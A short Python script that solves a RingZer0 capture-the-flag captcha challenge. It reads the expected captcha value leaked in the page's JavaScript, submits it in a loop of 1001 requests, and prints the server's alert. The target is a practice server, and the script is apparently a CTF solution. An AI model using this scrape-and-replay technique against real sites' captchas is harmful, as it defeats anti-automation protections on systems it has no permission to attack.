#!/usr/bin/env python
# -*- coding: utf-8 -*-
import requests, time, re, os, sys, lxml.html
from requests.auth import HTTPBasicAuth

def ch138():
	ek = 'RZ_CH138_PW'
	if not ek in os.environ:
			print('err: {0} environment variable not set'.format(ek))
			sys.exit(1)
	s = requests.Session()
	auth = HTTPBasicAuth('captcha', os.environ[ek])
	url = 'http://captcha.ringzer0team.com:7421'
	for _ in xrange(1001):
		time.sleep(0.10)
		r = s.get('{0}/form1.php'.format(url), auth=auth)
		m = re.search(r'if \(A == "([a-z0-9]*)"\)', r.text)
		captcha = m.group(1)
		r = s.get('{0}/captcha/captchabroken.php?new'.format(url), auth=auth)
		payload = {'captcha':captcha}
		r = s.post('{0}/captcha1.php'.format(url), auth=auth, data=payload)
		doc = lxml.html.document_fromstring(r.text)
		alert = doc.xpath('//div[contains(@class, "alert")]')[0]
		msg = alert.text_content().strip()
		print msg

if __name__ == '__main__':
	ch138()
